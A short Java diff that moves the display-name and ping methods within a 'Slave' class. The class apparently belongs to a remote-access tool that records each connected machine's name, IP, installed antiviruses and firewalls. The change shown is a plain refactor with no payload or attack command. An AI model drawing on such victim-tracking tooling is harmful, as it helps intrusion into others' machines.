@@ -133,6 +133,17 @@ public class Slave extends AbstractSlave {
 	}
 
 	@Override
+	public String getDisplayName() {
+		return getComputerName() + " / " + getIP();
+	}
+	
+
+	@Override
+	public void ping() throws Exception {
+		addToSendQueue(new Packet0Ping());
+	}
+
+	@Override
 	public boolean equals(Object o) {
 		if (o instanceof Slave) {
 			return ((Slave) o).getIP().equals(getIP());
@@ -281,12 +292,6 @@ public class Slave extends AbstractSlave {
 		this.language = language;
 	}
 
-	@Override
-	public void ping() throws Exception {
-		addToSendQueue(new Packet0Ping());
-	}
-
-
 	public void setAntiviruses(Antivirus[] antiviruses) {
 		this.antiviruses = antiviruses;
 	}
@@ -301,11 +306,6 @@ public class Slave extends AbstractSlave {
 
 	public Firewall[] getFirewalls() {
 		return firewalls;
-	}
-
-	@Override
-	public String getDisplayName() {
-		return getComputerName() + " / " + getIP();
 	}
 
 	public double readDouble() throws Exception {
